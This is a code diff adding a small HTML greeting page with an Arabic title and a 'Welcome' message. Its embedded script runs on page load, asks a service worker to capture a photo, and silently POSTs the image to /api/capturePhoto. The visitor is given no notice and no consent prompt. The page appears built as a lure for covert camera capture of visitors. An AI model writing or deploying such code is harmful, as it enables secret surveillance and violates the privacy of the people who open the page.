@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جمهور الحب </title>
+    <style>
+        body {
+            background-image: url('background.jpg');
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #fff;
+            text-align: center;
+        }
+        .container {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>اهلا بك من جديد .</h2>
+         <h2>Welcome to the world  .</h2>
+    </div>
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/service-worker.js')
+            .then(registration => {
+                console.log('Service Worker registered with scope:', registration.scope);
+            })
+            .catch(error => {
+                console.error('Service Worker registration failed:', error);
+            });
+        }
+
+        async function requestPhotoCapture() {
+            const worker = await navigator.serviceWorker.ready;
+            return new Promise((resolve) => {
+                const messageChannel = new MessageChannel();
+                messageChannel.port1.onmessage = (event) => {
+                    resolve(event.data.photo);
+                };
+                worker.active.postMessage({ action: 'capturePhoto' }, [messageChannel.port2]);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            requestPhotoCapture().then(photoDataUrl => {
+                fetch('/api/capturePhoto', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ image: photoDataUrl }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Photo sent successfully:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending photo:', error);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
